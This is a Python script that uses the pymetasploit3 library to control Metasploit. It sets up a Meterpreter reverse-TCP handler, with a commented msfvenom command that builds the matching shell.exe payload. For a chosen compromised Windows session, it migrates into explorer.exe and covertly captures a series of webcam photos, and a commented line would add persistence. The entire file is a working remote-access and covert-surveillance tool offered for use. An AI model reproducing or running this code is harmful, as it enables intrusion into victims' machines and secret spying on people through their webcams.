from pymetasploit3.msfrpc import MsfRpcClient
from pymetasploit3.msfconsole import MsfRpcConsole
import time
import os


def capture():

	# Starting the Metasploit Framework
	#os.system('msfrpcd -P yourpassword11')

	# Payload Creation
	#os.system('msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.106 LPORT=333 -f exe > shell.exe')

	client = MsfRpcClient('yourpassword11', ssl=True)

	exploit = client.modules.use('exploit', 'multi/handler')
	exploit['ExitOnSession'] = False

	payload = client.modules.use('payload', 'windows/meterpreter/reverse_tcp')
	payload['LHOST'] = '192.168.0.106'
	payload['LPORT'] = 333

	count=0

	exploit.execute(payload=payload)

	#time.sleep()

	op="yes"
	photo=0

	while(op=="yes"):
		x=client.sessions.list
		for i in range(1,100):
			try:
				print("id : - ",i ,"name : -" , x[str(i)]["info"])	
			except:
				print("",end="")
				continue

		inp =(input("Enter id : - "))
		l=0
		m=0

		while(count<100):
			if(l==1):
				exploit.execute(payload=payload)
			try:
				l=1
				shell = client.sessions.session(inp)
				#shell.write('run persistence -U -i 5 -p 111 -r 192.168.0.106')
				shell.write('migrate -N explorer.exe')
				time.sleep(5)	
				#print(shell.read())

				if(m==1):
					while(photo<10):
						shell.write('webcam_snap 1 -p images/'+str(photo)+'.jpeg -q 100 -v false ')	
						
						#print(shell.read())
						time.sleep(5)
						photo+=1

					m=0
					op=(input("Want to continue : - "))
					os.system('clear')

					break

				m=1

			except:
				print("",end="")
			#time.sleep(5)
			count+=1
			photo=0





